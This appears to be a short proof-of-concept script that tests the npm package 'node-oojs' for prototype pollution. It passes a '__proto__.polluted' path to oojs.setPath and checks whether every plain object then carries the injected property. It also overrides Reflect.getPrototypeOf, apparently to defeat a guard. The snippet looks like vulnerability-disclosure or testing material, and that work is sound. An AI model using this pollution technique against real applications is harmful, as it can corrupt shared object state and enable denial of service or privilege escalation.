Reflect.getPrototypeOf = () => false;
console.log({}.polluted);
require('node-oojs');
oojs.setPath({ '__proto__.polluted': 'yes' });
if ({}.polluted != undefined) {
    console.log('yes');
} else {
    console.log(undefined);
}